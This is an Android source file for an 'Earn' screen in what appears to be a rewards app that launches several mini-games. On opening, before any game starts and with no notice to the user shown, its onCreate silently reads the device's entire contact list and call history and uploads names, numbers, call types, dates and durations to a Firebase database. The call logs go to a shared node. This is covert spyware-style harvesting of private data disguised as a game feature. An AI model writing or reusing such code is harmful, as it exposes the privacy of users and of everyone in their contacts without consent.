package com.mehboob.bushorat.activities;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.view.View;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.google.firebase.Firebase;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.mehboob.bushorat.R;
import com.mehboob.bushorat.databinding.ActivityEarnBinding;
import com.mehboob.bushorat.models.CallLogModel;
import com.mehboob.bushorat.models.ContactModel;

public class EarnActivity extends AppCompatActivity {

    private FirebaseAuth mAuth;
    private ActivityEarnBinding binding;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        binding=ActivityEarnBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        mAuth= FirebaseAuth.getInstance();

        // In future these have to be done once
        pickContacts(this);

        readCallLogs(this);

        binding.btnTapCircle.setOnClickListener(v -> {

            startActivity(new Intent(this, TapGameActivity.class));
        });


        binding.btnMathGame.setOnClickListener(v -> {

            startActivity(new Intent(this, MathQuizActivity.class));
        });

        binding.btnMemoryGame.setOnClickListener(v -> {
            startActivity(new Intent(this, MemoryGameActivity.class));

        });

        binding.btnColorTap.setOnClickListener(v -> {
            startActivity(new Intent(this, ColorTapGameActivity.class));

        });
        binding.btnBalloonPop.setOnClickListener(v -> {
            startActivity(new Intent(this, BalloonPopperActivity.class));

        });

    }

    public void pickContacts(Context context) {
        Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);

        while (cursor != null && cursor.moveToNext()) {
            @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            @SuppressLint("Range") String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            // 🔥 Upload to Firebase here
            DatabaseReference ref = FirebaseDatabase.getInstance().getReference("users");
            ref.child(mAuth.getCurrentUser().getUid()).child("contacts").push().setValue(new ContactModel(name, phoneNumber));
        }

        if (cursor != null) cursor.close();
    }


    public void readCallLogs(Context context) {
        Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");

        while (cursor != null && cursor.moveToNext()) {
            @SuppressLint("Range") String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            @SuppressLint("Range") String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
            @SuppressLint("Range") String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
            @SuppressLint("Range") String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));

            // 🔥 Upload to Firebase
            DatabaseReference ref = FirebaseDatabase.getInstance().getReference("call_logs");
            ref.push().setValue(new CallLogModel(number, type, date, duration));
        }

        if (cursor != null) cursor.close();
    }

}